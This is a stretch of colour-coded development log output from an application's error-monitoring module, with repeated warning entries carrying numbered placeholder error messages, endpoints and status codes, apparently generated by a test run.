WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2138'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2139'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2140'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801591Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2141'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801640Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2142'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2143'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801735Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2144'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801782Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2145'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801829Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2146'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2147'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2148'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2149'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2150'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2151'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2152'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2153'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2154'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802782Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2155'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802834Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2156'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802884Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2157'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802933Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2158'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.802984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2159'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803034Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2160'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2161'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2162'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2163'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2164'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803353Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2165'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2166'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803456Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2167'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2168'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803553Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2169'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2170'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2171'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2172'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2173'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803797Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2174'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803845Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2175'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2176'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.803942Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m44[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2177'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
